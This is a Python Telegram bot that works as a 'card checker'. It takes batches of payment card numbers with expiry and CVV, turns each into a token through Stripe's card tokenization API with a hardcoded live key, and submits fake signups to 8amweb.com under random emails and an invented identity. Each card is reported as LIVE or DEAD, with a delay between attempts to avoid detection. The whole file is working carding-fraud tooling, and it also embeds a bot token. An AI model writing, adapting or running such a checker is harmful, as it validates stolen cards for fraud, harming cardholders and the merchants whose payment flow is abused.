import telebot
import requests
import random
import string
import time

BOT_TOKEN = "8072279299:AAF7-9MjDIYkoH6iuDztpbSmyQBvz3kRjG0"
bot = telebot.TeleBot(BOT_TOKEN)

STRIPE_PUBLISHABLE_KEY = "pk_live_4CKMbP1u5l354SB3pNjQ9iii"
EIGHTAMWEB_URL = "https://www.8amweb.com/signup.php"

def generate_random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def generate_random_email():
    return generate_random_string() + "@gmail.com"

def generate_random_subdomain():
    return generate_random_string(10)

def parse_card_input(text):
    parts = text.strip().split('|')
    if len(parts) != 4:
        return None
    cc, mm, yy, cvv = map(str.strip, parts)
    if not (cc.isdigit() and mm.isdigit() and cvv.isdigit() and (len(yy) == 2 or len(yy) == 4)):
        return None
    if len(yy) == 2:
        yy = "20" + yy
    return cc, mm.zfill(2), yy, cvv

def check_card(cc, mm, yy, cvv):
    guid = ''.join(random.choices(string.ascii_lowercase + string.digits, k=32))
    muid = ''.join(random.choices(string.ascii_lowercase + string.digits, k=32))
    sid = ''.join(random.choices(string.ascii_lowercase + string.digits, k=32))
    time_on_page = str(random.randint(10000, 99999))
    payment_user_agent = "stripe.js/78ef418"
    email = generate_random_email()
    subdomain = generate_random_subdomain()
    name = "Peshang Salam"
    phone = "3144740104"
    zip_code = "08107"
    city = "3144740104"
    company = "Kurd"
    address = "198 White Horse Pike"
    state = "NJ"
    country = "US"
    password = "War112233$%"

    # Step 1: Create Stripe token
    stripe_data = {
        "time_on_page": time_on_page,
        "pasted_fields": "number",
        "guid": guid,
        "muid": muid,
        "sid": sid,
        "key": STRIPE_PUBLISHABLE_KEY,
        "payment_user_agent": payment_user_agent,
        "card[number]": cc,
        "card[cvc]": cvv,
        "card[exp_month]": mm,
        "card[exp_year]": yy,
    }
    stripe_headers = {
        "content-type": "application/x-www-form-urlencoded",
        "accept": "application/json",
        "origin": "https://js.stripe.com",
        "referer": "https://js.stripe.com/",
        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/130.0.6723.37 Mobile/15E148 Safari/604.1"
    }
    try:
        stripe_resp = requests.post("https://api.stripe.com/v1/tokens", data=stripe_data, headers=stripe_headers)
        stripe_json = stripe_resp.json()
        stripe_token = stripe_json.get("id", "")
        if not stripe_token or not stripe_token.startswith("tok_"):
            return f"❌ Stripe error: {stripe_json.get('error', {}).get('message', stripe_json)}"
    except Exception as e:
        return f"❌ Stripe error: {str(e)}"

    # Step 2: Post to 8amweb
    web_headers = {
        "content-type": "application/x-www-form-urlencoded",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "origin": "https://www.8amweb.com",
        "referer": "https://www.8amweb.com/signup.php",
        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/130.0.6723.37 Mobile/15E148 Safari/604.1"
    }
    web_data = {
        "subdomain": subdomain,
        "item": "item_1",
        "name": name,
        "email": email,
        "reg_password": password,
        "reg_password_confirmation": password,
        "account_info": "1",
        "company": company,
        "address": address,
        "country": country,
        "state": state,
        "city": city,
        "zip": zip_code,
        "phone": phone,
        "pay_type": "card",
        "stripeToken": stripe_token,
        "terms_and_policies": "1",
        "timezoneoffset": "-180",
        "lang": "en-US",
        "main_page": "aa3c7efbd24cb4db235cbffd1a891d47",
        "auth_key": ""
    }
    try:
        web_resp = requests.post(EIGHTAMWEB_URL, data=web_data, headers=web_headers)
        text = web_resp.text
        if "Payment Failed" in text:
            return f"❌ DEAD: {cc}|{mm}|{yy}|{cvv} (Payment Failed)"
        else:
            return f"✅ LIVE: {cc}|{mm}|{yy}|{cvv}"
    except Exception as e:
        return f"❌ 8amweb error: {str(e)}"

@bot.message_handler(commands=['start'])
def start_handler(message):
    bot.send_message(message.chat.id,
        "💳 Welcome to the 8amweb Card Checker Bot!\n"
        "Send one or multiple cards separated by new lines.\n"
        "Each card must be in the format:\n"
        "CC|MM|YY|CVV or CC|MM|YYYY|CVV\n\n"
        "Example:\n"
        "4242424242424242|05|25|123\n"
        "5108750563572478|06|2029|269"
    )

@bot.message_handler(func=lambda message: True)
def card_handler(message):
    cards = message.text.strip().split('\n')
    for card_line in cards:
        parsed = parse_card_input(card_line)
        if not parsed:
            bot.send_message(message.chat.id, f"❌ Invalid format: {card_line}")
            continue
        cc, mm, yy, cvv = parsed
        result = check_card(cc, mm, yy, cvv)
        bot.send_message(message.chat.id, result)
        time.sleep(10)  # 10 seconds delay between cards

bot.infinity_polling()